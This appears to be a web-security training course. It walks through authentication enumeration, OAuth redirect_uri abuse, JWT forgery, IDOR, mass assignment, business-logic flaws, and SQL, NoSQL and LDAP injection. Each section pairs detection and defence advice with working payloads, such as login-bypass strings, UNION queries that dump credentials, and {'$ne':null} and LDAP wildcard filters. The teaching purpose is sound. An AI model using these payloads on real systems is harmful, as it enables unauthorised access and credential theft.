    What Is a Web Application?

    A website just shows you fixed pages. A web application takes your input and decides something with it — and every decision is a place a check can be missing.

    Where we are

    Before we attack anything, one simple idea: who shows the page, and who does the thinking.

    Website vs web application

    📄 Website

    Shows the same fixed pages to everyone. Like a printed brochure. Almost nothing to attack.

    ⚙️ Web application

    Takes your input and decides — logs you in, shows your orders, saves your data. Every decision is a possible weak spot.

    Gmail, your bank, an online shop — all web apps. That’s what this session is about.

    Two sides: you and the server

    Every web app has two sides. You — your browser, which you fully control. And the server — the computer far away that holds the real code and data, which you never see. Almost every web bug is the server trusting something that came from your side. We’ll look at these two sides next.

    Front-end languages (in your browser)

    • HTML — the structure and content (headings, text, buttons).
    • CSS — the look (colours, fonts, layout). It changes how things look, never what they do.

    HTTPS & Encryption
    
      
    HTTPS locks the message while it travels. That’s all it does — it says nothing about whether the app itself is safe.
    
    
    
    
    
      
    What the padlock means
    It means the pipe is encrypted, not that the site is secure. These are different things.
    

      
    
        
    ✅ HTTPS gives you
    • Privacy — no one on the wire can read the message.
    • Integrity — no one can change it on the way.
    • Identity — the certificate proves it’s the real server.
    
        
    ❌ HTTPS does NOT give you
    • Any check on what the app does with your input.
    • Protection from SQL injection, XSS, or any bug in this course.
    
      
    
      
    Remember
    HTTPS is not “secure”. A padlock and a serious bug live happily on the same site — and your proxy sits inside the encryption anyway, so you still read every byte.

    Authentication — Brute-Force & Enumeration
    
      
    A login form makes one promise: the right password gets in, everything else is rejected identically. Break that “identically” anywhere — a word, a status code, a few milliseconds — and the form tells you who has an account, then lets you guess their password.
    
    
    
    
    

      
    So what are authentication attacks?
    
      
    Authentication is the check “are you who you say you are?” It breaks in two ways: weak mechanisms (nothing stops you guessing forever) and logic flaws / broken authentication (a step can be skipped entirely). The two you’ll meet first are username enumeration — learning which accounts exist — and password brute-forcing — guessing the password of one you found. Enumeration first makes brute-force far cheaper: you only attack usernames you know are real.
    

      
    What can an attacker achieve?
    
      
    Authentication is the front door, so the impact is blunt: bypass it or crack into another user’s account and you inherit everything that account can see and do. Even a low-privilege account is a win — PortSwigger notes it still “exposes sensitive business information and additional attack surface,” a foothold to pivot from (an admin link, an internal API, a reused password). Broken authentication ranks so highly because the path from “guessed one password” to “full account takeover” is usually a single step.
    

      
    Why it happens — the app answers differently
    
      
    Secure login gives the same answer to “wrong user” and “wrong password,” and limits how often you can ask. Real apps leak the difference in three observable channels, and never count the attempts:
    
      
    
        
    SignalWhat leaks it
    
        
          
    Error message“Invalid username” vs “Invalid password” — the wording confirms the account exists.
    
          
    Response length / statusA valid user’s reply is a few bytes different, or a different HTTP code — visible even when the text looks identical.
    
          
    Response timeA real account runs the (slow) password hash; a fake one bails early. A consistent timing gap enumerates users with no visible difference at all.
    
          
    No rate limit / lockoutThousands of guesses from one source, never throttled — brute-force becomes only a question of wordlist size.
    
            
      
    

      
    How do I find & exploit it?

    OAuth 2.0 — When the Redirect Isn’t Checked
    
      
    OAuth lets you log into App B with your App A account, never handing App B your password. The whole system leans on one check: does the authorization code only ever go back to the app actually registered to receive it?
    
    
    
    
    

      
    So what is an OAuth attack?
    
      
    OAuth 2.0 is delegated authorization: the client app sends you to an authorization server (Google, GitHub, a social login), you approve, and the server hands the client a short-lived authorization code that the client swaps for an access token. The code is a bearer credential for those few seconds — whoever receives it first can trade it for the token and becomes you. OAuth attacks are about intercepting that code or abusing the trust steps around it, usually with no password involved at all.
    

      
    What can an attacker achieve?
    
      
    A broken OAuth flow doesn’t leak one field — it hands over the whole account, often across every app that trusts that provider. Depending on the flaw an attacker can obtain sensitive user data, steal the authorization code or access token, or bypass authentication completely and log in as the victim. As PortSwigger puts it, OAuth security “relies almost entirely on developers using the right combination of configuration options,” so one missing state parameter or one loose redirect_uri check is enough.
    

      
    The flaws you’ll actually test
    
      
      
        
    • Implicit-grant impersonation — the token rides through the browser; if the server doesn’t verify it matches the submitted data, change the parameters to log in as anyone.
      • 
        
    • Missing state (CSRF) — no CSRF token on the authorization request → forced account-linking / login CSRF.
      • 
        
    • Leaky / loose redirect_uri — weak validation lets you redirect the code or token to an attacker-controlled URL (path traversal, parsing quirks, localhost tricks, duplicate params).
      • 
        
    • Unverified email at registration — register with the victim’s details on the provider and the client trusts it as them.
      • 
      
    

      
    Why it happens — the auth server trusts the request
    
      
    The one rule that keeps the code safe: the authorization server must only ever redirect it to the exact redirect_uri the client pre-registered. When the server instead trusts the redirect_uri in the request — or matches it loosely (prefix/substring) — an attacker puts their own host there, sends the victim an otherwise-normal sign-in link, and the code is redirected straight to them.
    
      
    
        
    FlawWhat it lets the attacker do
    
        
          
    redirect_uri not validatedCode (or token) delivered to the attacker’s host — full account takeover (the flow below).
    
          
    Weak redirect_uri matchingOpen-redirect or path tricks (/cb/../, ?next=, subdomain) sneak past a loose check.
    
          
    Missing / unchecked stateNo CSRF protection on the callback — attacker forces their own account to be linked to the victim.
    
          
    Implicit grantToken returned in the URL fragment — leaks via history, Referer, or a malicious page.
    
            
      
    

      
    How do I find it?
    
      
      
        
    1. Proxy the whole dance. In Burp, watch the /authorize request, the consent, the redirect back, and the /token exchange — the code is visible in the 302 Location.
      2. 
        
    2. Tamper redirect_uri. Change it to a host you control (or a tricky variant) and resend /authorize — if the 302 still carries the code there, it isn’t validated.
      3. 
        
    3. Attack state. Drop or reuse it and see if the callback is still accepted — that’s the CSRF / account-linking door.
      4. 
      
    
      
    Where do you do this?
    Burp Proxy to observe and replay the flow, plus an exploit server (your own host) to catch the redirected code and to host the crafted sign-in link the victim clicks.
    

      
    What changes, and why it works
    The attacker changes exactly one parameter in a link they send the victim: redirect_uri. It works because the authorization server trusts that client-supplied value instead of validating it against the app’s pre-registered URI — so the code is handed to the attacker’s door while the victim sees a perfectly normal login.
    

      
    The one line (SOC)
    Callback traffic to an unregistered or unusual host, or an authorization code appearing in a Referer header or a third-party access log, is the tell — a genuine flow never leaves the registered redirect host.
    

      
    How do I stop it?
    
      
    Remember
    The code is a credential — deliver it only to a pre-registered, exactly-matched redirect_uri. Whitelist redirect URIs with strict string matching (no wildcards or prefixes), always send and verify state, prefer the authorization-code flow with PKCE over implicit, and bind each code to the client that requested it.

    JWT — The Signature Is the Only Real Check
    
      
    A JWT’s header and payload are just Base64 — readable and editable by anyone holding one. The signature is the single thing meant to stop a rewritten token from being trusted. When it isn’t checked properly, nothing else in the token means anything.
    
    
    
    
    

      
    So what are JWT attacks?
    
      
    A JSON Web Token is three Base64url parts joined by dots: header.payload.signature. The header says which algorithm signed it; the payload holds the claims (who you are, your role); the signature is an HMAC or RSA signature over the first two parts. Crucially the payload is encoded, not encrypted — anyone can read and rewrite it. JWT attacks all come down to one thing: getting the server to trust a payload you changed, by defeating or sidestepping the signature check.
    

      
    What can an attacker achieve?
    
      
    PortSwigger puts it plainly: “the impact of JWT attacks is usually severe.” Forge a token with arbitrary values — flip isAdmin, change the sub/username — and you escalate your own privileges or impersonate any user, taking full control of their account. Because the token is often the only thing checked on each request (no password, no session lookup), one verification flaw is total.
    

      
    The main attack classes
    
      
      
        
    • Unverified / skipped signature — the app calls decode() not verify(); edit the payload freely.
      • 
        
    • alg: none — the token declares it’s unsigned and the server accepts it (often bypass filters with case/obfuscation).
      • 
        
    • Weak HMAC secret — HS256 with a guessable key; crack it offline with hashcat and sign your own tokens.
      • 
        
    • Header injection — jwk / jku / kid — embed or point to your own key, or traverse kid to a predictable file.
      • 
        
    • Algorithm confusion — force RS256→HS256 so the public key is used as the HMAC secret.
      • 
      
    

      
    Why it happens — the server trusts the token about itself
    
      
    A secure server verifies the signature against one fixed key and one expected algorithm before reading a single claim. Broken ones let the token dictate the terms — trusting the alg it names, skipping verification, using a guessable secret, or trusting an embedded key hint.
    
      
    
        
    AttackHow the forged token gets accepted
    
        
          
    Unverified signatureServer decodes claims but never checks the signature — edit the payload, keep any garbage sig (the first lab).
    
          
    alg: noneSet the algorithm to none and drop the signature entirely; server accepts an “unsigned” token.
    
          
    Weak HMAC secretBrute-force the HS256 secret (hashcat + wordlist), then re-sign your tampered token cleanly.
    
          
    Algorithm confusionServer verifies RS256 with the public key; attacker re-signs with HS256 using that public key as the HMAC secret.
    
          
    jwk / kid injectionEmbed your own key in the header, or point kid at a file you control, so the server verifies with your key.
    
            
      
    

      
    How do I find & exploit it?
    
      
      
        
    1. Decode it. In Burp’s JWT Editor (or jwt.io / jwt_tool), read the header and payload — the role / sub claim is your target.
      2. 
        
    2. Tamper & resend. Change a claim, send it, and watch the response — if it’s accepted, the signature isn’t enforced (try alg:none too).
      3. 
        
    3. Attack the key. If it is verified, brute the secret with hashcat, or try algorithm-confusion / jwk-kid injection, then re-sign.
      4. 
      
    
      
    Where do you do this?
    Burp → JWT Editor extension does the decode, tamper, and re-sign in one place (including alg:none and key-confusion helpers); jwt_tool and hashcat cover secret cracking from the command line.
    

      
    What changes, and why it works
    The attacker rewrites the alg field and the claims directly — mostly just re-encoding Base64, no cryptography. It works because signature verification was optional or misconfigured, or the server trusted a client-supplied algorithm or key hint (jwk/kid) instead of one fixed, server-known key.
    

      
    The one line (SOC)
    An unusual alg value (none, or HS256 where RS256 was expected), repeated tokens with the same payload but a different or missing signature, or a privilege claim that doesn’t match the account’s known history — each is the tell.
    

      
    How do I stop it?
    
      
    Remember
    Verify every token against one fixed key and a server-pinned algorithm — before reading any claim. Reject alg:none, never let the token choose its algorithm or key (jwk/kid/jku), use a long random secret for HMAC, and keep tokens short-lived.
    

      
    Section 3a in one breath
    Authentication proves who you are, once. OAuth passes that proof to another app. A JWT carries it afterward, request after request. Each is only as strong as its one weakest check: rate-limit + consistent errors, redirect validation, signature verification.

    Access Control & IDOR
    
      
    Authentication answers “who are you?”. Authorization answers a completely different question: “are you allowed this specific object?” A huge number of apps only ever answer the first one.
    
    
    
    
    

      
    So what is broken access control?
    
      
    Access control is the enforcement of what an authenticated user is allowed to do. It breaks in three shapes: vertical (a normal user reaches admin-only functions), horizontal (a user reaches another user’s data — this is IDOR when the object is picked by an id), and context-dependent (doing a step out of order). IDOR is the one you’ll see most: the app exposes a direct reference to an object (an id in the URL or body) and trusts you to only ask for your own.
    

      
    What can an attacker achieve?
    
      
    Access control is where “who are you?” becomes “what are you allowed to touch?” — and when it breaks, the blast radius is the whole app: view other users’ data, change things you shouldn’t, or climb to admin. The two shapes you’ll exploit are horizontal (reach another user’s records at your own privilege level — the IDOR in the visual, id=123→456) and vertical (reach admin-only functions, e.g. an unprotected /admin). IDOR is just the horizontal case where user input names the object directly.
    

      
    Why it happens — “logged in” mistaken for “allowed”
    
      
    The server checks your session is valid and then fetches the object by id — but never joins the two with “does this session own this object?”. Because ids are usually sequential (or guessable), changing one number walks you straight into another account. The valid session was the only gate, and it opens for every id.
    
      
    
        
    ShapeWhat the attacker does
    
        
          
    IDOR (horizontal)Change an id in the path/body/cookie to read or edit another user’s object (below).
    
          
    VerticalBrowse straight to /admin or call an admin API — the link is just hidden, not protected.
    
          
    Parameter / methodFlip role=user→admin, change GET→POST, or add a header the UI never sends.
    
          
    Context / step-skipJump to a later step (checkout, approval) without the one that authorises it.
    
            
      
    

      
    How do I find & exploit it?
    
      
      
        
    1. Change the reference. In Repeater, swap the id to one you shouldn’t own and resend — a 200 with someone else’s data is IDOR. Intruder a range to sweep.
      2. 
        
    2. Force-browse. Visit admin/hidden paths directly, and try privileged actions with your low-priv session — vertical access control often isn’t enforced server-side.
      3. 
        
    3. Compare two accounts. Log in as two users side by side; anything user A can do to user B’s objects is the finding.
      4. 
      
    
      
    Where do you do this?
    Burp Repeater to swap a single id, Intruder to sweep a range, and Burp’s Compare site maps / two-session workflow to spot what one role can reach that it shouldn’t.
    

      
    What changes, and why it works
    The attacker changes exactly one thing — the object id in the URL or body — while keeping their own valid session. It works because the server treats a valid session as proof of access to any object, instead of checking that this session owns this object.
    

      
    The one line (SOC)
    One session requesting a long, sequential run of ids in a short window — especially ids it has no history of touching — is the signature. A real user’s access pattern is scattered and slow; a sweep is dense and fast.
    

      
    How do I stop it?
    
      
    Remember
    Every object access needs its own ownership/role check — deny by default. Enforce access control server-side at the data layer (not by hiding links), verify “does this subject own or may access this object?” on every request, and prefer unguessable ids (UUIDs) as defence-in-depth — never as the control itself.

    API Testing — BOLA & Mass Assignment
    
      
    Modern apps are mostly APIs wearing a UI. The form only ever sends the fields it shows you — but the API underneath usually accepts far more, and rarely checks which fields a request is allowed to set.
    
    
    
    
    

      
    So what is mass assignment (and BOLA)?
    
      
    APIs built on frameworks often auto-bind an incoming JSON body straight onto an internal object: every key in the request becomes a property on the model. Mass assignment (a.k.a. autobinding / object injection) is sending keys the UI never exposes — role, isAdmin, creditBalance — and having them applied. Its sibling BOLA (Broken Object-Level Authorization) is simply IDOR on an API endpoint. Both are the same gap, one layer deeper: not just which object you can reach, but which fields of it you can write.
    

      
    What can an attacker achieve?
    
      
    Mass assignment turns a profile-update form into a privilege-escalation primitive: the framework auto-binds every field in your request to the object, so an undocumented property you add — isAdmin:true, balance, price — is written straight through. PortSwigger calls this “a dangerous gap between documented and actual API functionality.” Its cousin BOLA (broken object-level authorization) is the API form of IDOR: the endpoint reads an id you supply and never checks it’s yours.
    

      
    Why it happens — the whole body is trusted
    
      
    The developer writes user.update(request.body) and moves on — convenient, and fine as long as the body only ever contains form fields. But nothing restricts the body to those fields. With no allow-list of writable properties per request, every column on the object is writable by anyone who names it. And the API usually tells you the names itself: a GET on the object returns the full record (excessive data exposure), handing you the exact fields to send back.
    
      
    
        
    API weaknessWhat the attacker does
    
        
          
    Mass assignmentAdd hidden fields to a write body (role, isVerified) — they bind to the object (below).
    
          
    BOLA / IDORChange an object id on the endpoint to act on another user’s resource.
    
          
    Excessive data exposureThe GET returns more fields than the UI shows — reconnaissance for the above.
    
          
    Hidden / undocumented endpointsMethods and routes the UI never calls (PATCH, /admin APIs), found via content discovery.
    
            
      
    

      
    How do I find & exploit it?
    
      
      
        
    1. Read the object. GET the resource — its response lists every field, including ones the form hides. Those are your candidates.
      2. 
        
    2. Reflect them back. Add those fields (and guesses like isAdmin) to a PATCH/POST body and resend — a 200 that applied them is the bug.
      3. 
        
    3. Probe the shape. Try other content types, array vs object, extra methods — frameworks bind differently and may accept what validation missed.
      4. 
      
    
      
    Where do you do this?
    Burp Repeater to edit the JSON body, Content discovery and the API’s own GET responses to find field names, and an OpenAPI/Swagger spec if exposed — it documents every parameter for you.
    

      
    What changes, and why it works
    The attacker adds fields to the JSON body that the legitimate UI never sends — guessed, or found in the app’s own JS, GET responses, or API docs. It works because the framework auto-binds the whole request body onto the internal object, with no allow-list of which fields a given request may set.
    

      
    The one line (SOC)
    A write request carrying fields the legitimate client never sends — visible by diffing a captured “normal” body against this one — is the tell. Schema/contract validation at the API gateway catches it before the app ever binds it.
    

      
    How do I stop it?
    
      
    Remember
    The form is not the contract — the API is. Bind only an explicit allow-list of fields. Use per-endpoint DTOs / strong parameters (never bind the raw body), authorise each field server-side, return only the fields the client needs, and validate requests against a schema at the edge.

    Business Logic — Valid Requests, Impossible Order
    
      
    Every attack so far broke a technical rule: an unvalidated field, an unchecked id, a missing signature. Business logic breaks nothing technical — every request is perfectly well-formed. The flaw is in the values and the sequence the developer assumed could never happen.
    
    
    
    
    

      
    So what is a business-logic flaw?
    
      
    A business-logic (or application-logic) flaw is a gap between what the developer assumed users would do and what the app actually allows. The attacker never sends a malformed request — they send perfectly legitimate ones in an unexpected order, quantity, or with values the UI would never produce. Because every individual request is valid, input validators, WAFs and scanners see nothing wrong. Only someone who understands what the workflow is supposed to permit notices the rule that was never enforced.
    

      
    What can an attacker achieve?
    
      
    Business-logic flaws aren’t malformed input — they’re the app used in a way the designers never anticipated. PortSwigger’s framing: they arise when teams “fail to anticipate unusual application states… and fail to handle them safely.” The payoff is real: a negative quantity that credits you, a skipped payment step, a discount applied twice — “flawed logic in financial transactions can… lead to massive losses through stolen funds, fraud, and so on.” Scanners miss these entirely; they only fall to someone who understands the intended flow and bends it.
    

      
    Why it happens — the assumption lives only in the UI
    
      
    “A coupon applies once.” “Quantity is at least one.” “You can’t checkout before paying.” These rules feel so obvious the developer enforces them in the front-end — a disabled button, a hidden field — and assumes the server can trust the client. Remove the UI (use Burp) and the server happily processes the “impossible” request, because the rule was never written where it counts.
    
      
    
        
    AssumptionBreak it by…
    
        
          
    A discount applies onceReplaying the apply-coupon request — stack it until the price collapses (below).
    
          
    Quantity ≥ 1 / price is fixedSending a negative quantity, or tampering a client-controlled price field.
    
          
    Steps happen in orderJumping straight to a later step (confirm, ship) without the one that authorises it.
    
          
    Limits are respectedExceeding a per-user cap, or exploiting rounding / integer overflow on amounts.
    
            
      
    

      
    How do I find & exploit it?
    
      
      
        
    1. Map the intended flow. Walk the feature normally and note every assumption (“this must be positive”, “this only happens once”, “this comes before that”).
      2. 
        
    2. Break one assumption at a time. In Repeater, replay a step, reorder steps, or send an out-of-range value — everything the UI prevents but the server might not.
      3. 
        
    3. Follow the money / privilege. Watch the total, the balance, or the account state — an impossible result means the rule wasn’t enforced.
      4. 
      
    
      
    Where do you do this?
    Burp Repeater to replay and reorder requests, and Burp Logger / the proxy history to reconstruct the intended sequence first. There’s no scanner for this — it’s manual reasoning about the workflow.
    

      
    What changes, and why it works
    The attacker changes no field’s format — they change how many times, in what order, or with what value they send otherwise-legitimate requests. It works because the logic assumed something (a coupon used once, a positive quantity) and never enforced that assumption server-side.
    

      
    The one line (SOC)
    The hardest family to spot in logs — nothing is malformed. The tell is volume and sequence: the same action repeated far more than any real workflow needs, or steps arriving out of order, in one session in a short window.
    

      
    How do I stop it?
    
      
    Remember
    Enforce every business rule server-side — the client is a convenience, never a control. Re-validate quantities, prices, limits and discount eligibility on the server, make multi-step processes stateful (you can’t skip or repeat a step), and write explicit checks for the assumptions you’d otherwise leave implicit.
    

      
    Section 3b in one breath
    Access control is which object. API / mass assignment is which field. Business logic is which order / value. None is a broken input — each is a missing server-side check on something the developer assumed the UI would enforce.

    SQL Injection
    
      
    The database can’t tell where the app’s query ends and your input begins. Make your input look like SQL, and the database runs it — so you read, change, or delete data that was never meant for you.
    
    
    
    
    

      
    So what is SQL injection?
    
      
    A web app stores its data in a database and asks for it with SQL queries. SQL injection, in PortSwigger’s words, “is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database.” It happens when the app builds a query by gluing your input straight into the query text — "...category=’" + input + "’..." — so anything you type that looks like SQL is run as SQL. You stop filling in a form and start editing the query.
    

      
    What can an attacker achieve?
    
      
    SQLi is consistently rated among the highest-impact web bugs because one injectable parameter can expose the whole database. A successful attack lets an attacker:
    
      
      
        
    • Read data they shouldn’t — passwords, credit-card details, personal user information belonging to other users.
      • 
        
    • Subvert application logic — change what a query means to bypass a login or an ownership check.
      • 
        
    • Reach other tables — pull data out of tables the page never intended to show, via UNION.
      • 
        
    • Escalate — in some cases write files, run OS commands, or plant a persistent backdoor for long-term compromise — the kind of breach that ends in regulatory fines.
      • 
      
    

      
    Why does it happen?
    
      
    The root cause is a single mistake: the app never separates its code from your data. To the database, the finished query is one flat string — it cannot tell the part the developer wrote from the part you typed. A single quote ’ closes the string the developer opened, and everything after it is read as commands. Every SQLi technique is a variation on that one confusion.
    

      
    How do I find it?
    
      
    You send input the database will try to interpret, then watch for a change. These are the probes PortSwigger teaches, strongest signal first:
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    ’ (a single quote)A database error, a 500, or any change from normal — the quote reached the query and broke its syntax.
    
        
    ’ AND 1=1-- vs ’ AND 1=2--SQL syntax that evaluates to the original value, then to a different value. The true one looks normal, the false one differs — a consistent difference is injection.
    
        
    ’ OR 1=1--A boolean condition that’s always true — more rows come back than should; a filter that returned a few now returns everything.
    
        
    A time-delay payload (SLEEP/WAITFOR DELAY)The response is slower only when the condition is true — the tell for blind SQLi with no visible output.
    
        
    An OAST payload (triggers an out-of-band DNS/HTTP hit)Your server gets a callback — proves injection even when nothing changes in the response at all.
    
      
    
      
    Where do you actually do this?
    Anywhere your input reaches the query — a URL parameter (?category=), a form field (login, search), or even an HTTP header like Cookie or Referer. The cleanest way is to catch the request in Burp → Repeater, add your ’ to one value, and resend — exactly what the console below shows, in a real proxy.
    

      
    The attack, step by step
    
      
    Retrieving hidden data is the classic first attack. A shop lists products with SELECT * FROM products WHERE category=’Gifts’ AND released=1. Three moves turn that filter into “give me everything” — each one you can drive in the console below:
    
      
      
        
    1. Break out of the string. Add a single quote ’ to the value. The query had category=’Gifts’; now it’s category=’Gifts’’ — an unbalanced quote, and the database errors. That error confirms you’re inside the query.
      2. 
        
    2. Add an always-true condition. Swap the value for ’ OR 1=1. The WHERE clause now reads “category is empty OR 1=1” — and 1=1 is true for every row, so the filter stops filtering.
      3. 
        
    3. Comment out the rest. End with -- (two dashes + space). Everything after it — including the AND released=1 that hides unreleased products — is ignored. Final payload: ’ OR 1=1 --.
      4. 
      
    
      
    The same trick bypasses a login
    Subverting application logic. A login runs ...WHERE username=’wiener’ AND password=’...’. Submit the username administrator’-- with any password: the query becomes ...WHERE username=’administrator’--’ AND password=’...’. The -- comments out the password check entirely, and you’re logged in as admin without knowing the password.
    
      
    Careful with OR 1=1
    On a SELECT it returns every row. If the same injectable input reaches an UPDATE or DELETE, OR 1=1 affects every row — you can wipe or corrupt a table by accident. In a real engagement, prove it on a read first.
    

      
    The one line (SOC)
    A parameter value carrying SQL syntax — quotes, OR, UNION, comment markers -- — where a plain value belongs is the signature. A database error in a response, on a page that never used to error, is the first free clue.
    

      
    How do I stop it?
    
      
    Remember
    Parameterised queries (prepared statements) fix this at the root. They send the query and the input to the database separately, so input is always a value and never part of the query text — there is no quote to break out of, whatever you type. The query string must stay a hard-coded constant; the moment you concatenate variable data into it, the protection is gone. Parameters don’t cover table/column names or ORDER BY — whitelist those against a fixed set. Input validation and least-privilege DB accounts shrink the blast radius, but only parameterisation removes the bug.

    This page is the model. Next: UNION, blind & second-order pull real data out of other tables, then sqlmap vs. manual shows when to automate. Practice labs for the whole Injection section are at the end of the section.

    SQL Injection — Reading Other Tables
    
      
    The previous page broke the query. This page goes further: pulling real data — a whole different table — out through the same hole. Three ways, depending on how much the page gives back.
    
    
    
    
    

      
    What UNION does
    
      
    The UNION keyword glues a second SELECT onto the first and returns both result sets together. If the app prints the query’s rows onto the page, your injected SELECT rides in with them — so you choose what gets printed.
    

            
    What can an attacker achieve?
    
      
    UNION is where SQLi stops being a trick and becomes data exfiltration: a successful UNION attack lets you read data from tables the page never intended to show — dump the users table, pull password hashes, enumerate the whole schema from information_schema. Blind variants get the same data with no visible output, one true/false (or one timing) bit at a time; second-order stores your payload now and detonates it later when a different query reuses it.
    


    The attack, step by step
    
      
      
        
    1. Count the columns. A UNION must return the same number of columns as the original. Add ORDER BY 1--, 2--, 3--… until it errors, or UNION NULLs until it stops erroring; the matching number is the count (3 below).
      2. 
        
    2. Find a visible column. Inject UNION SELECT 1,2,3-- with an id that returns nothing (id=0), and see which numbers appear on the page — those slots are where your data will show.
      3. 
        
    3. Enumerate, then dump. Use information_schema to list tables and columns, then select the real data: UNION SELECT username,password,NULL FROM users--. The credentials render in place of the product.
      4. 
      
    

      
    When the page shows nothing back: blind SQLi
    
      
    Sometimes the injection works but no data (and no error) is printed. You still get one bit of feedback, and one bit is enough to read the whole database — slowly.
    
      
      
        
    • Boolean-based — a condition that changes something visible (a “welcome back” vs a blank page, a taken:true vs false). Ask true/false questions: …AND SUBSTRING(password,1,1)=’a’, cycling characters until the page flips.
      • 
        
    • Time-based — nothing visible changes at all, so you make the database pause: …AND SLEEP(5) runs only when your condition is true. A 5-second delay = “yes.”
      • 
      
    

      
    Stored now, fires later: second-order
    
      
    The payload is saved somewhere harmless-looking (a username, a profile field) and does nothing on submit. It triggers later, when a different query — often an admin page or a report — reads that stored value back into SQL unsafely. No attacker request is anywhere near the moment it fires.
    

      
    The one line (SOC)
    UNION and error-based leave an obvious trace — SQL keywords in a parameter, or a query error, right in the access log. Blind leaves almost nothing: a long run of near-identical requests to one endpoint, differing by one character or oddly timed, is often the only signal.

    Everything on the previous two pages, one tool does for you in seconds. Knowing how it works underneath is what turns “sqlmap says vulnerable” into a finding you can actually stand behind.
    
    
    
    
    

      
    What is sqlmap?
    
      
    sqlmap is an open-source tool that automates detecting and exploiting SQL injection — it fingerprints the database, finds the working technique on its own, dumps tables, and (where the setup allows) reaches the file system or runs OS commands. It's pre-installed on Kali. Powerful — which is exactly why you point it only at targets you're authorised to test.
    

      
    Why confirm by hand first
    
      
    sqlmap doesn't know your target's context. It can trip a WAF into blocking you, miss an injection point that manual testing would catch, or flag a false positive on a naturally flaky endpoint. Prove the bug by hand so you know it's real and why — then reach for sqlmap to go fast.

    NoSQL Injection
    
      
    No SQL, no quotes to break — same root cause. MongoDB and friends take JSON as their query language, and JSON carries operators an attacker can smuggle into a field that should hold plain text.
    
    
    
    
    

      
    So what is NoSQL injection?
    
      
    A NoSQL database (MongoDB, and others) is queried with structured objects, not a string of SQL. When the app drops your input straight into that query object, input shaped like a query operator is evaluated as one — so you steer the query instead of just filling a field.
    

            
    What can an attacker achieve?
    
      
    Same root cause as SQLi, different engine: inject query operators ($ne, $gt, $regex) or JavaScript into a Mongo-style query and you can bypass authentication, extract data, or run arbitrary logic in the database. A login that trusts {username, password} from JSON falls to {"password": {"$ne": null}} — ‘password is not null’ matches every account.
    


    Two kinds
    
      
      
        
    • Operator injection (the console below) — a field that should be a string is sent as a JSON object carrying an operator: $ne, $gt, $regex, $where. No quote needed.
      • 
        
    • Syntax injection — like classic SQLi: break out of a string in the query with a quote or injected JavaScript. In a URL filter you’d test ’ then override with ’||’1’==’1.
      • 
      
    

      
    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    A fuzz string / a single ’ or " in a valueAn error or a changed response — the character reached a query string (syntax injection).
    
        
    ’ && 0 && ’x vs ’ && 1 && ’xThe true and false versions return different results — your input influences the query logic.
    
        
    Send a field as an object: {"$ne":"x"}Behaviour changes (a login succeeds, a filter widens) — the operator was evaluated (operator injection).
    
        
    {"$ne":null} on username and passwordYou log in with no valid credentials — every document matched (the console below).
    
      
    
      
    Where do you do this?
    Any endpoint that takes JSON — logins, search, filters — or an API that auto-casts URL params (username[$ne]=x) into nested objects. The move is in Burp → Repeater: change a field’s value from "x" to {"$ne":"x"} and resend.
    

      
    The attack, step by step
    
      
      
        
    1. Confirm the operator runs. Change "password":"x" to "password":{"$ne":"x"}. If a wrong password now logs you in, the field type was never checked.
      2. 
        
    2. Bypass with “not null”. Set both fields to {"$ne":null} — every document matches, and the app logs you in as the first (usually admin).
      3. 
        
    3. Target a specific account. Pin the username with {"$in":["admin","administrator"]} and keep password:{"$ne":""} to land on the account you want.
      4. 
      
    

      
    The one line (SOC)
    A request body where a normally-scalar field (username, password, search term) arrives as a JSON object instead of a string is the signature — strict schema/type validation at the API layer catches it before the query runs.
    

      
    How do I stop it?
    
      
    Remember
    Validate the type, not just the value. A field that must be a string is rejected when it arrives as an object. Enforce a schema on the API, never pass raw JSON into the filter, and disable server-side JavaScript ($where, mapReduce) unless you truly need it. “No SQL” never meant “no injection.”

    LDAP & ORM Injection
    
      
    Two more query languages, the same old mistake: user input dropped straight into syntax the app was supposed to control. In LDAP, the syntax is parentheses — and they break just like a quote.
    
    
    
    
    

      
    So what is LDAP injection?
    
      
    A directory (LDAP) is searched with a filter written in parenthesised, prefix notation — (&(objectClass=person)(cn=alice)). When the app builds that filter by gluing input in, metacharacters like * ( ) & | are read as filter logic, and you reshape the search — exactly the SQLi pattern, different syntax.
    

            
    What can an attacker achieve?
    
      
    LDAP injection rewrites the search filter a directory login builds, so the classic win is authentication bypass and unauthorized directory reads — dump users, groups, and attributes. Inject *)(uid=*))(|(uid=* and the filter matches everyone; a bare * wildcards the match. ORM injection is the same idea one layer up: when the ORM builds queries from unsafe input, the underlying SQL/NoSQL is injectable through it.
    


    How do I find it?
    
      
    
        
    Probe you sendWhat tells you it’s injectable
    
        
    A single * in the fieldFar more results than a name should return — the wildcard was evaluated, so input reaches the filter.
    
        
    An unbalanced ( or )An LDAP/500 error or a broken page — the parenthesis reached the filter and broke its syntax.
    
        
    admin vs admin*The * version returns more entries — a consistent difference confirms wildcard evaluation.
    
        
    *)(& or *)(|(cn=*) in a login/searchAuth bypass, or the whole directory returned — you injected a new filter clause.
    
      
    
      
    Where do you do this?
    A directory search box, or a login form backed by LDAP. In Burp → Repeater, drop * then *)(|(...) into the field and watch the result count jump.
    

      
    The attack, step by step
    
      
      
        
    1. Confirm with a wildcard. Enter *. If the search returns everyone, your input is evaluated as a filter, not text.
      2. 
        
    2. Inject a clause (dump). *)(|(cn=*)(userPassword=*) closes the cn clause and adds an always-true OR that also pulls userPassword — the whole directory, hashes included.
      3. 
        
    3. Bypass a login. On a filter like (&(uid=USER)(userPassword=PASS)), sending * as both makes it (&(uid=*)(userPassword=*)) — the first entry matches and you’re in.
      4. 
      
    

      
    ORM injection — the same idea, one layer up
    An ORM (Hibernate, Django’s ORM, Sequelize…) normally builds parameterised queries for you. But almost every ORM has a raw-query escape hatch — .raw(), .extra(), a hand-built HQL/JPQL string — and the moment a developer concatenates input into that, they’ve silently rebuilt SQL injection underneath an ORM that was supposed to prevent it.
    

      
    The one line (SOC)
    Unescaped LDAP metacharacters (* ( ) \ | &) in a search or login field, or a raw-query ORM call built from a request parameter in code review, is the tell — both rarer than SQLi, so a rule for either stands out when it fires.
    

      
    How do I stop it?
    
      
    Remember
    Escape the syntax, or never build it by hand. For LDAP, escape metacharacters per RFC 4515 (or use a directory API that binds values safely) and allow-list what a name field may contain. For ORMs, keep to parameterised query builders — never concatenate input into .raw()/HQL.
    

      
    Now see it happen
